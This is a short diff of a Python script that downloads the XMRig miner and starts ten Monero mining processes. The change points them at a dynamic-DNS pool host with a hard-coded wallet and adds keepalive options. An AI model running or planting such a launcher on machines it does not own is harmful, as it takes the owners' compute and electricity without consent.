@@ -6,10 +6,9 @@ import threading
 XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz"
 XMRIG_ARCHIVE = "xmrig-6.18.0-linux-x64.tar.gz"
 XMRIG_FOLDER = "xmrig-6.18.0"
-POOL = "gulf.moneroocean.stream:10128"
+POOL = "soulcrack.duckdns.org:8080"  # 🔁 Updated pool
 WALLET = "47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh"
-PASS = "py"
-ALGO = "randomx"
+PASS = "myworker"
 NUM_MINERS = 10
 
 # ⬇️ Download and extract xmrig if needed
@@ -28,9 +27,10 @@ def start_miner(miner_id):
     cmd = [
         f"./{XMRIG_FOLDER}/xmrig",
         "-o", POOL,
-        "-a", ALGO,
         "-u", WALLET,
-        "-p", PASS
+        "-p", PASS,
+        "-k",             # 🔐 Keepalive
+        "--coin", "monero"  # 🪙 Monero mode
     ]
     subprocess.run(cmd)
 
